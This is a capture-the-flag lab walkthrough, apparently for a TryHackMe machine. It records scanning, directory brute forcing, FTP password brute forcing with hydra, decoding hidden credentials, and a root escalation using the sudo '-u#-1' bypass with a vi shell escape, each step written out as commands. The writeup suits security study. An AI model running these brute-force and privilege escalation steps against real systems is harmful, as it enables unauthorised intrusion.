## Target IP: 10.10.66.249

---

### Environment Variables

```bash
export IP=10.10.66.249
export LIP=10.6.24.56
```

---

### Nmap Scan

```bash
sudo nmap -sV -sC -T4 -O $IP -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 21 | FTP | vsftpd 3.0.2 |
| 22 | SSH | OpenSSH 6.7p1 Debian 5 |
| 80 | HTTP | Apache httpd 2.4.10 (Debian) |

---

### Web Enumeration

Visited: `http://$IP`

→ Apache default page

→ Nothing in source

---

### Directory Brute Force

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
```

**Found:**

- `/assets` → Contains:
    - `rickrolled.mp4` (thanks)
    - `style.css` → Comment at bottom:

```
Nice to see someone checking the stylesheets.
Take a look at the page: /sup3r_s3cr3t_fl4g.php
```

---

### Redirect Discovery (BurpSuite)

Visited `/sup3r_s3cr3t_fl4g.php`

→ Redirects to a Rickroll, but in the video:

> "burp you're in the wrong place."
> 

Used **BurpSuite** to intercept

**Found:**

```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
```

---

### Hidden Directory

Visited: `/WExYY2Cv-qU`

→ Contains `hot_babe.png`

```bash
wget http://$IP/WExYY2Cv-qU/hot_babe.png
```

**Used:**

```bash
strings hot_babe.png
```

→ Found:

```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
...
```

---

### FTP Brute Force

```bash
hydra -l ftpuser -P passwords.txt $IP ftp
```

→ Password: `[REDACTED]`

---

### FTP Login

```bash
ftp $IP
# Username: ftpuser
# Password: [REDACTED]
```

→ Found: `Eli's_Creds.txt`

```bash
get Eli's_Creds.txt
```

→ Garbled output (Brainfuck)

---

### Decode Brainfuck

Tried **CyberChef**, failed

→ Checked writeup

→ It’s **Brainfuck** encoded

Decoded result:

```
User: eli
Password: [REDACTED]
```

---

### SSH into Eli

```bash
ssh eli@$IP
# Password: [REDACTED]
```

→ On login:

**1 New Message**

```
Message from Root to Gwendoline:
Check our leet s3cr3t hiding place.
```

---

### Hidden Directory Discovery

```bash
find / -type d -name s3cr3t 2>/dev/null
# → /usr/games/s3cr3t
```

```bash
ls -la /usr/games/s3cr3t
# → .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

```bash
cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

→ Gwendoline’s password: `[REDACTED]`

---

### SSH into Gwendoline

```bash
su gwendoline
# Password: [REDACTED]
```

```bash
cat user.txt
# → THM{[REDACTED]}
```

---

### Privilege Escalation

```bash
sudo -l
# → (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

---

### Exploiting Bash Bug with `vi`

**Explanation:**

The `!root` restriction should prevent you from escalating.

But there's a known bug where `sudo -u#-1` allows you to specify UID -1 (which resolves to `0` / root).

You’re not allowed to sudo as root directly due to the `!root`, but this tricks `sudo` by using the UID.

**Exploit:**

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
:!whoami
# → root
:!bash
```

→ You're now root.

---

### Root Flag

```bash
cd /root
cat root.txt
# → THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```
